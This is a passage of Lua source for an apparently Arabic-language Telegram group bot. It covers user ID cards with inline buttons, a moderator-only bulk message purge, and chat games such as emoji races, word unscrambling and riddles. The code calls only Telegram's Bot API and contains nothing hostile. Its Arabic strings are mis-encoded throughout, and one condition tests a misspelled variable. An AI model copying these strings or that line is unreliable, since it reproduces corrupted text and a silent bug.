local texte = '\nβ― Ψ§ΩΨ§ΩΨ―Ω β― '..Id..'\nβ― ΩΨΉΨ±ΩΩ β― '..UserName_User..'\nβ― Ψ±ΨͺΨ¨ΨͺΩ β― '..Status_Gps..'\nβ― Ψ±Ψ³Ψ§Ψ¦ΩΩ β― '..NumMsg..' \nβ― ΨͺΩΨ§ΨΉΩΩ β― '..TotalMsg..'\nβ― ΩΩΨ¨Ω β― '..lakbk..'\nβ―Ψ§ΩΨ¨Ψ§ΩΩ β― '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=msg.sender_user_id_.."/ideeng"},{text = 'ar', callback_data=msg.sender_user_id_.."/idearp"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
else
if get_id then
local get_id = get_id:gsub('#AddMem',Add_Mem) 
local get_id = get_id:gsub('#id',Id) 
local get_id = get_id:gsub('#username',UserName_User) 
local get_id = get_id:gsub('#msgs',NumMsg) 
local get_id = get_id:gsub('#edit',message_edit) 
local get_id = get_id:gsub('#stast',Status_Gps) 
local get_id = get_id:gsub('#auto',TotalMsg) 
local get_id = get_id:gsub('#Description',Description) 
local get_id = get_id:gsub('#game',Num_Games) 
local get_id = get_id:gsub('#photos',Total_Photp) 
local texte = '['..get_id..']'
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown")
else
local texte = '\nβ― Ψ§ΩΨ§ΩΨ―Ω β― '..Id..'\nβ― Ψ§ΩΩΨΉΨ±Ω β― '..UserName_User..'\nβ― Ψ±ΨͺΨ¨ΨͺΩ β― '..Status_Gps..'\nβ― Ψ±Ψ³Ψ§Ψ¦ΩΩ β― '..NumMsg..' \nβ― ΨͺΩΨ§ΨΉΩΩ β― '..TotalMsg..'\nβ― ΩΩΨ¨Ω β― '..lakbk..'\nβ― Ψ§ΩΨ¨Ψ§ΩΩ β― '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=msg.sender_user_id_.."/ideeng"},{text = 'ar', callback_data=msg.sender_user_id_.."/idearp"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end,nil) 
end,nil) 
end,nil) 
end
end
if text == 'ΩΨͺΨ­ Ψ§ΩΩΨ³Ψ­' and Manger(msg) then 
database:del(bot_id..'lock:del'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨ³Ψ­') 
end
if text == 'ΩΩΩ Ψ§ΩΩΨ³Ψ­' and Manger(msg) then 
database:set(bot_id..'lock:del'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΩΩΩ Ψ§ΩΩΨ³Ψ­') 
end
if text and text:match('^ΩΨ³Ψ­ (%d+)$') and Admin(msg) and not database:get(bot_id..'lock:del'..msg.chat_id_) then 
local Number = tonumber(text:match('^ΩΨ³Ψ­ (%d+)$')) 
if Number > 1000 then 
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΩΨΆΩΩ Ψ§ΩΨ«Ψ± ΩΩ *~ 1000* Ψ±Ψ³Ψ§ΩΩ') 
return false 
end 
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576
end
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΩΨ³Ψ­ *~ '..Number..'* Ψ±Ψ³Ψ§ΩΩ .') 
end


if text == 'Ψ§ΩΨ―Ω' and tonumber(msg.reply_to_message_id_) > 0 and not database:get(bot_id..'Lock:ID:Bot'..msg.chat_id_) then
function Function_Tshake(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.first_name_ == false then
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ ΩΨ§ ΨͺΩΨ¬Ψ― ΩΨΉΩΩΩΨ§ΨͺΩ ')
return false
end
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.id_
local NumMsg = database:get(bot_id..'messageUser'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..msg.chat_id_..data.id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..msg.chat_id_..":"..data.id_) or 0
local texte = '\nβ― Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨ?Ψ§Ψ΅ Ψ¨Ω β― '..Id..'\nβ― Ψ§ΩΩΨΉΨ±Ω Ψ§ΩΨ?Ψ§Ψ΅ Ψ¨Ω β― '..UserName_User..'\nβ― Ψ±ΨͺΨ¨ΨͺΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ β― '..Status_Gps..'\nβ― ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦ΩΩ Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΩ β― '..NumMsg..' \nβ― ΨͺΩΨ§ΨΉΩΩ ΩΨ§ Ψ΅Ψ―ΩΩΩ β― '..TotalMsg..'\nβ― ΩΩΨ¨Ω Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΨ© β― '..lakbk..'\nΨ§ΩΨ¨Ψ§ΩΩ => '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=msg.sender_user_id_.."/ideeng1@"..Id},{text = 'ar', callback_data=msg.sender_user_id_.."/idearp1@"..Id},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ§ΩΨ―Ω @(.*)$") and not database:get(bot_id..'Lock:ID:Bot'..msg.chat_id_) then
local username = text:match("^Ψ§ΩΨ―Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.id_
local NumMsg = database:get(bot_id..'messageUser'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..msg.chat_id_..data.id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..msg.chat_id_..":"..data.id_) or 0
local texte = '\nβ― Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨ?Ψ§Ψ΅ Ψ¨Ω β― '..Id..'\nβ― Ψ§ΩΩΨΉΨ±Ω Ψ§ΩΨ?Ψ§Ψ΅ Ψ¨Ω β― '..UserName_User..'\nβ― Ψ±ΨͺΨ¨ΨͺΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ β― '..Status_Gps..'\nβ― ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦ΩΩ Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΩ β― '..NumMsg..' \nβ― ΨͺΩΨ§ΨΉΩΩ ΩΨ§ Ψ΅Ψ―ΩΩΩ β― '..TotalMsg..'\nβ― ΩΩΨ¨Ω Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΨ© β― '..lakbk..'\nβ―Ψ§ΩΨ¨Ψ§ΩΩ β― '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=msg.sender_user_id_.."/ideeng1@"..Id},{text = 'ar', callback_data=msg.sender_user_id_.."/idearp1@"..Id},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
else
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text == "Ψ³ΩΨ§ΩΩΨ§Ψͺ" or text == "Ψ³ΩΨ§ΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Sma"..msg.chat_id_)
Random = {"π","π","π","π","π","π","π","π","π","π","π","π","π₯₯","π₯","π","π","π₯","π₯¦","π₯","πΆ","π½","π₯","π₯","π₯","π₯","π","π₯¨","π","π§","π₯","π³","π₯","π₯©","π","π","π­","π","π ","π","π₯ͺ","π₯","βοΈ","π΅","π₯€","πΆ","πΊ","π»","π","β½οΈ","π","βΎοΈ","πΎ","π","π","π±","π","πΈ","π₯","π°","π?","π³","π―","π²","π»","πΈ","πΊ","π₯","πΉ","πΌ","π§","π€","π¬","π¨","Ω­","πͺ","π","π«","π","π΅","π","π","π₯","π·","π","π","π","π","π","π","π","π","π?πΆ","β","π‘","π?","π‘","π£","π","π","π","π","π","π","πͺ","π«","π¬","π­","β°","πΊ","π","βοΈ","π‘"}
SM = Random[math.random(#Random)]
database:set(bot_id.."Tshak:Random:Sm"..msg.chat_id_,SM)
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ±Ψ³Ω ΩΨ§Ψ°Ψ§ Ψ§ΩΨ³ΩΨ§ΩΩ ? ~ {`"..SM.."`}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Random:Sm"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Sma"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Sma"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ³ΩΨ§ΩΩ , Ψ³ΩΨ§ΩΩΨ§Ψͺ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Set:Sma"..msg.chat_id_,true)
return false
end 
if text == "Ψ§ΩΨ§Ψ³Ψ±ΨΉ" or tect == "ΨͺΨ±ΨͺΩΨ¨" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Speed:Tr"..msg.chat_id_)
KlamSpeed = {"Ψ³Ψ­ΩΨ±","Ψ³ΩΨ§Ψ±Ω","Ψ§Ψ³ΨͺΩΨ¨Ψ§Ω","ΩΩΩΩ","Ψ§ΩΩΩΩ","Ψ¨Ψ²ΩΩΩ","ΩΨ·Ψ¨Ψ?","ΩΨ±Ψ³ΨͺΩΨ§ΩΩ","Ψ―Ψ¬Ψ§Ψ¬Ω","ΩΨ―Ψ±Ψ³Ω","Ψ§ΩΩΨ§Ω","ΨΊΨ±ΩΩ","Ψ«ΩΨ§Ψ¬Ω","ΩΩΩΩ","Ψ³ΩΩΩΩ","Ψ§ΩΨΉΨ±Ψ§Ω","ΩΨ­Ψ·Ω","Ψ·ΩΨ§Ψ±Ω","Ψ±Ψ§Ψ―Ψ§Ψ±","ΩΩΨ²Ω","ΩΨ³ΨͺΨ΄ΩΩ","ΩΩΨ±Ψ¨Ψ§Ψ‘","ΨͺΩΨ§Ψ­Ω","Ψ§Ψ?Ψ·Ψ¨ΩΨ·","Ψ³ΩΩΩΩ","ΩΨ±ΩΨ³Ψ§","Ψ¨Ψ±ΨͺΩΨ§ΩΩ","ΨͺΩΨ§Ψ­","ΩΨ·Ψ±ΩΩ","Ψ¨ΨͺΩΨͺΩ","ΩΩΨ§ΩΩ","Ψ΄Ψ¨Ψ§Ω","Ψ¨Ψ§Ψ΅","Ψ³ΩΩΩ","Ψ°Ψ¨Ψ§Ψ¨","ΨͺΩΩΨ§Ψ²","Ψ­Ψ§Ψ³ΩΨ¨","Ψ§ΩΨͺΨ±ΩΩΨͺ","Ψ³Ψ§Ψ­Ω","Ψ¬Ψ³Ψ±"};
name = KlamSpeed[math.random(#KlamSpeed)]
database:set(bot_id.."Tshak:Klam:Speed"..msg.chat_id_,name)
name = string.gsub(name,"Ψ³Ψ­ΩΨ±","Ψ³ Ψ± Ω Ψ­")
name = string.gsub(name,"Ψ³ΩΨ§Ψ±Ω","Ω Ψ± Ψ³ Ω Ψ§")
name = string.gsub(name,"Ψ§Ψ³ΨͺΩΨ¨Ψ§Ω","Ω Ψ¨ Ψ§ Ψͺ Ω Ψ³ Ψ§")
name = string.gsub(name,"ΩΩΩΩ","Ω Ω Ω Ω")
name = string.gsub(name,"Ψ§ΩΩΩΩ","Ω Ω Ω Ψ§")
name = string.gsub(name,"Ψ¨Ψ²ΩΩΩ","Ψ² Ω Ω Ω")
name = string.gsub(name,"ΩΨ·Ψ¨Ψ?","Ψ? Ψ¨ Ψ· Ω")
name = string.gsub(name,"ΩΨ±Ψ³ΨͺΩΨ§ΩΩ","Ψ³ Ψͺ Ψ§ Ω Ω Ω Ψ± Ω")
name = string.gsub(name,"Ψ―Ψ¬Ψ§Ψ¬Ω","Ψ¬ Ψ¬ Ψ§ Ψ― Ω")
name = string.gsub(name,"ΩΨ―Ψ±Ψ³Ω","Ω Ω Ψ― Ψ± Ψ³")
name = string.gsub(name,"Ψ§ΩΩΨ§Ω","Ω Ψ§ Ω Ψ§ Ω")
name = string.gsub(name,"ΨΊΨ±ΩΩ","ΨΊ Ω Ψ± Ω")
name = string.gsub(name,"Ψ«ΩΨ§Ψ¬Ω","Ψ¬ Ω Ψͺ Ω Ψ§")
name = string.gsub(name,"ΩΩΩΩ","Ω Ω Ω Ω")
name = string.gsub(name,"Ψ³ΩΩΩΩ","Ω Ω Ω Ω Ψ³")
name = string.gsub(name,"Ψ§ΩΨΉΨ±Ψ§Ω","Ω ΨΉ Ψ§ Ω Ψ± Ψ§")
name = string.gsub(name,"ΩΨ­Ψ·Ω","Ω Ψ· Ω Ψ­")
name = string.gsub(name,"Ψ·ΩΨ§Ψ±Ω","Ψ± Ψ§ Ψ· Ω Ω")
name = string.gsub(name,"Ψ±Ψ§Ψ―Ψ§Ψ±","Ψ± Ψ§ Ψ± Ψ§ Ψ―")
name = string.gsub(name,"ΩΩΨ²Ω","Ω Ψ² Ω Ω")
name = string.gsub(name,"ΩΨ³ΨͺΨ΄ΩΩ","Ω Ψ΄ Ψ³ Ω Ψͺ Ω")
name = string.gsub(name,"ΩΩΨ±Ψ¨Ψ§Ψ‘","Ψ± Ψ¨ Ω Ω Ψ§ Ψ‘")
name = string.gsub(name,"ΨͺΩΨ§Ψ­Ω","Ψ­ Ω Ψ§ Ψͺ Ω")
name = string.gsub(name,"Ψ§Ψ?Ψ·Ψ¨ΩΨ·","Ψ· Ψ¨ Ω Ψ§ Ψ? Ψ·")
name = string.gsub(name,"Ψ³ΩΩΩΩ","Ω Ω Ω Ω Ψ³")
name = string.gsub(name,"ΩΨ±ΩΨ³Ψ§","Ω Ω Ψ± Ψ³ Ψ§")
name = string.gsub(name,"Ψ¨Ψ±ΨͺΩΨ§ΩΩ","Ψ± Ψͺ Ω Ψ¨ Ψ§ Ω Ω")
name = string.gsub(name,"ΨͺΩΨ§Ψ­","Ψ­ Ω Ψ§ Ψͺ")
name = string.gsub(name,"ΩΨ·Ψ±ΩΩ","Ω Ψ· Ω Ψ± Ω")
name = string.gsub(name,"Ψ¨ΨͺΩΨͺΩ","Ψ¨ Ψͺ Ψͺ Ω Ω")
name = string.gsub(name,"ΩΩΨ§ΩΩ","Ω Ω Ω Ω Ω")
name = string.gsub(name,"Ψ΄Ψ¨Ψ§Ω","Ψ¨ Ψ΄ Ψ§ Ω")
name = string.gsub(name,"Ψ¨Ψ§Ψ΅","Ψ΅ Ψ§ Ψ¨")
name = string.gsub(name,"Ψ³ΩΩΩ","Ω Ψ³ Ω Ω")
name = string.gsub(name,"Ψ°Ψ¨Ψ§Ψ¨","Ψ¨ Ψ§ Ψ¨ Ψ°")
name = string.gsub(name,"ΨͺΩΩΨ§Ψ²","Ψͺ Ω Ω Ψ² Ψ§")
name = string.gsub(name,"Ψ­Ψ§Ψ³ΩΨ¨","Ψ³ Ψ§ Ψ­ Ω Ψ¨")
name = string.gsub(name,"Ψ§ΩΨͺΨ±ΩΩΨͺ","Ψ§ Ψͺ Ω Ψ± Ω Ω Ψͺ")
name = string.gsub(name,"Ψ³Ψ§Ψ­Ω","Ψ­ Ψ§ Ω Ψ³")
name = string.gsub(name,"Ψ¬Ψ³Ψ±","Ψ± Ψ¬ Ψ³")
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ±ΨͺΨ¨ΩΨ§ ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Klam:Speed"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Speed:Tr"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Speed:Tr"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΨ§Ψ³Ψ±ΨΉ , ΨͺΨ±ΨͺΩΨ¨ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Speed:Tr"..msg.chat_id_,true)
end 

if text == "Ψ­Ψ²ΩΨ±Ω" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Hzora"..msg.chat_id_)
Hzora = {"Ψ§ΩΨ¬Ψ±Ψ³","ΨΉΩΨ±Ψ¨ Ψ§ΩΨ³Ψ§ΨΉΩ","Ψ§ΩΨ³ΩΩ","Ψ§ΩΩΨ·Ψ±","5","Ψ§ΩΩΨͺΨ§Ψ¨","Ψ§ΩΨ¨Ψ³ΩΨ§Ψ±","7","Ψ§ΩΩΨΉΨ¨Ω","Ψ¨ΩΨͺ Ψ§ΩΨ΄ΨΉΨ±","ΩΩΨ§ΩΩ","Ψ§ΩΨ§","Ψ§ΩΩ","Ψ§ΩΨ§Ψ¨Ψ±Ω","Ψ§ΩΨ³Ψ§ΨΉΩ","22","ΨΊΩΨ·","ΩΩ Ψ§ΩΨ³Ψ§ΨΉΩ","Ψ§ΩΨ¨ΩΨͺΩΨ¬Ψ§Ω","Ψ§ΩΨ¨ΩΨΆ","Ψ§ΩΩΨ±Ψ§ΩΩ","Ψ§ΩΨΆΩΨ‘","Ψ§ΩΩΩΨ§Ψ‘","Ψ§ΩΨΆΩ","Ψ§ΩΨΉΩΨ±","Ψ§ΩΩΩΩ","Ψ§ΩΩΨ΄Ψ·","Ψ§ΩΨ­ΩΨ±Ω","Ψ§ΩΨ¨Ψ­Ψ±","Ψ§ΩΨ«ΩΨ¬","Ψ§ΩΨ§Ψ³ΩΩΨ¬","Ψ§ΩΨ΅ΩΨͺ","Ψ¨ΩΩ"};
name = Hzora[math.random(#Hzora)]
database:set(bot_id.."Tshak:Klam:Hzor"..msg.chat_id_,name)
name = string.gsub(name,"Ψ§ΩΨ¬Ψ±Ψ³","Ψ΄ΩΨ¦ Ψ§Ψ°Ψ§ ΩΩΨ³ΨͺΩ Ψ΅Ψ±Ψ? ΩΨ§ ΩΩΩ Ψ")
name = string.gsub(name,"ΨΉΩΨ±Ψ¨ Ψ§ΩΨ³Ψ§ΨΉΩ","Ψ§Ψ?ΩΨ§Ω ΩΨ§ ΩΨ³ΨͺΨ·ΩΨΉΨ§Ω ΨͺΩΨΆΩΩ Ψ§ΩΨ«Ψ± ΩΩ Ψ―ΩΩΩΩ ΩΨΉΨ§ ΩΩΨ§ ΩΩΨ§ Ψ")
name = string.gsub(name,"Ψ§ΩΨ³ΩΩ","ΩΨ§ ΩΩ Ψ§ΩΨ­ΩΩΨ§Ω Ψ§ΩΨ°Ω ΩΩ ΩΨ΅ΨΉΨ― Ψ§ΩΩ Ψ³ΩΩΩΨ© ΩΩΨ­ ΨΉΩΩΩ Ψ§ΩΨ³ΩΨ§Ω Ψ")
name = string.gsub(name,"Ψ§ΩΩΨ·Ψ±","Ψ΄ΩΨ¦ ΩΨ³ΩΨ· ΨΉΩΩ Ψ±Ψ£Ψ³Ω ΩΩ Ψ§ΩΨ§ΨΉΩΩ ΩΩΨ§ ΩΨ¬Ψ±Ψ­Ω ΩΩΨ§ ΩΩ Ψ")
name = string.gsub(name,"5","ΩΨ§ Ψ§ΩΨΉΨ―Ψ― Ψ§ΩΨ°Ω Ψ§Ψ°Ψ§ ΨΆΨ±Ψ¨ΨͺΩ Ψ¨ΩΩΨ³Ω ΩΨ§ΨΆΩΨͺ ΨΉΩΩΩ 5 ΩΨ΅Ψ¨Ψ­ Ψ«ΩΨ§Ψ«ΩΩ ")
name = string.gsub(name,"Ψ§ΩΩΨͺΨ§Ψ¨","ΩΨ§ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩ Ψ§ΩΨ±Ψ§Ω ΩΩΩΨ³ ΩΩ Ψ¬Ψ°ΩΨ± Ψ")
name = string.gsub(name,"Ψ§ΩΨ¨Ψ³ΩΨ§Ψ±","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ§ ΩΩΨ΄Ω Ψ§ΩΨ§ Ψ¨Ψ§ΩΨΆΨ±Ψ¨ Ψ")
name = string.gsub(name,"7","ΨΉΨ§Ψ¦ΩΩ ΩΨ€ΩΩΩ ΩΩ 6 Ψ¨ΩΨ§Ψͺ ΩΨ§Ψ? ΩΩΩ ΩΩΩΩ .ΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ§Ψ― Ψ§ΩΨΉΨ§Ψ¦ΩΩ ")
name = string.gsub(name,"Ψ§ΩΩΨΉΨ¨Ω","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΩΩΨ¬ΩΨ― ΩΨ³Ψ· ΩΩΨ© Ψ")
name = string.gsub(name,"Ψ¨ΩΨͺ Ψ§ΩΨ΄ΨΉΨ±","ΩΨ§ ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ°Ω ΩΩΨ³ ΩΩΩ Ψ§Ψ¨ΩΨ§Ψ¨ ΩΩΨ§ ΩΩΨ§ΩΨ° Ψ ")
name = string.gsub(name,"ΩΩΨ§ΩΩ","ΩΨ­Ψ―Ω Ψ­ΩΩΩ ΩΩΨΊΨ±ΩΨ±Ω ΨͺΩΨ¨Ψ³ ΩΩΨ© ΨͺΩΩΨ±Ω .ΩΩ ΩΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨ§","Ψ§Ψ¨Ω Ψ§ΩΩ ΩΨ§Ψ¨Ω Ψ§Ψ¨ΩΩ ΩΩΩΨ³ Ψ¨Ψ§Ψ?ΨͺΩ ΩΩΨ§ Ψ¨Ψ§Ψ?ΩΩ ΩΩΩ ΩΩΩΩ Ψ")
name = string.gsub(name,"Ψ§ΩΩ","Ψ§Ψ?Ψͺ Ψ?Ψ§ΩΩ ΩΩΩΨ³Ψͺ Ψ?Ψ§ΩΨͺΩ ΩΩ ΨͺΩΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨ§Ψ¨Ψ±Ω","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΩΨ§ Ψ?Ψ·Ψ§ Ψ?Ψ·ΩΩ ΩΩΨ― Ψ΄ΩΨ¦Ψ§ ΩΩ Ψ°ΩΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨ³Ψ§ΨΉΩ","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΩΩ Ψ§ΩΨ΅Ψ―Ω ΩΩΩΩΩ Ψ§Ψ°Ψ§ Ψ¬Ψ§ΨΉ ΩΨ°Ψ¨ Ψ")
name = string.gsub(name,"22","ΩΩ ΩΨ±Ω ΩΩΨ·Ψ¨Ω ΨΉΩΨ±Ψ¨Ψ§ Ψ§ΩΨ³Ψ§ΨΉΩ ΨΉΩΩ Ψ¨ΨΉΨΆΩΩΨ§ ΩΩ Ψ§ΩΩΩΩ Ψ§ΩΩΨ§Ψ­Ψ― ")
name = string.gsub(name,"ΨΊΩΨ·","ΩΨ§ ΩΩ Ψ§ΩΩΩΩΩ Ψ§ΩΩΨ­ΩΨ―Ω Ψ§ΩΨͺΩ ΨͺΩΩΨΆ ΨΊΩΨ· Ψ―Ψ§Ψ¦ΩΨ§ Ψ ")
name = string.gsub(name,"ΩΩ Ψ§ΩΨ³Ψ§ΨΉΩ","ΩΨ§ ΩΩ Ψ§ΩΨ³Ψ€Ψ§Ω Ψ§ΩΨ°Ω ΨͺΨ?ΨͺΩΩ Ψ§Ψ¬Ψ§Ψ¨ΨͺΩ Ψ―Ψ§Ψ¦ΩΨ§ Ψ")
name = string.gsub(name,"Ψ§ΩΨ¨ΩΨͺΩΨ¬Ψ§Ω","Ψ¬Ψ³Ω Ψ§Ψ³ΩΨ― ΩΩΩΨ¨ Ψ§Ψ¨ΩΨΆ ΩΨ±Ψ§Ψ³ Ψ§Ψ?ΨΈΨ± ΩΩΨ§ ΩΩ Ψ")
name = string.gsub(name,"Ψ§ΩΨ¨ΩΨΆ","ΩΨ§ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω Ψ§Ψ³ΩΩ ΨΉΩΩ ΩΩΩΩ Ψ")
name = string.gsub(name,"Ψ§ΩΩΨ±Ψ§ΩΩ","Ψ§Ψ±Ω ΩΩ Ψ΄ΩΨ¦ ΩΩ Ψ―ΩΩ ΨΉΩΩΩ ΩΩ Ψ§ΩΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨΆΩΨ‘","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ?ΨͺΨ±Ω Ψ§ΩΨ²Ψ¬Ψ§Ψ¬ ΩΩΨ§ ΩΩΨ³Ψ±Ω Ψ")
name = string.gsub(name,"Ψ§ΩΩΩΨ§Ψ‘","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ³ΩΨ± Ψ§ΩΨ§ΩΩ ΩΩΨ§ ΨͺΨ±Ψ§Ω Ψ")
name = string.gsub(name,"Ψ§ΩΨΆΩ","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΨ§Ψ­ΩΩ Ψ§ΩΩΩΨ§ ΨͺΨ°ΩΨ¨ Ψ ")
name = string.gsub(name,"Ψ§ΩΨΉΩΨ±","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΨ°Ω ΩΩΩΨ§ Ψ·Ψ§Ω ΩΨ΅Ψ± Ψ ")
